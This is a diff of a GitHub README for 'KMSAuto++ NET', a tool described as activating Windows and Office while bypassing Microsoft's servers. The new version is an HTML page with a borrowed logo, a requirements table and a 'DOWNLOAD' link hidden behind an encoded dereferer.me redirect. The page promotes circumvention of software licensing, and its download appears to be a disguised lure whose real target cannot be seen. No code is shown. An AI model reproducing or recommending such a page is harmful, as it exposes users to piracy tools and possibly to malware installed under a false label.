@@ -1,2 +1,28 @@
-# KMSAuto
-KMSAuto is a program that allows you to activate Microsoft Windows 10,11,8,7 and Microsoft Office 2021,2019,2016,2013 via a local network, bypassing the connection to official Microsoft servers. You can download KMSAuto++ NET from this official github repository.
+<p align="center"><img src="https://massgrave.dev/img/logo_small.png" alt="MAS Logo"></p>
+
+<h1 align="center">KMSAuto++ NET</h1>
+
+<p align="center"> 
+<table align="center">
+
+<tr>
+<td>OS: Windows 11-7;</td>
+</tr>
+<tr>
+<td>RAM: 512mb;</td>
+</tr>
+<tr>
+<td>HD: 200mb;</td>
+</tr>
+<tr>
+<td>License: FREE;</td>
+</tr>
+
+<tr>
+<td> 💾 <a href="https://dereferer.me/?ohr6ogvrjkJ4D4RjgP9GGvklVNj2KK-eGpzWOxgyPpyVxyBB0xNBrPNvemdqB6zGJqd3JAZKr-0ZAywGg77W-z7WJl5Nbbwl6"> DOWNLOAD KMSAUTO NET </a></td>
+</tr>
+
+  
+</table>
+
+ </p>
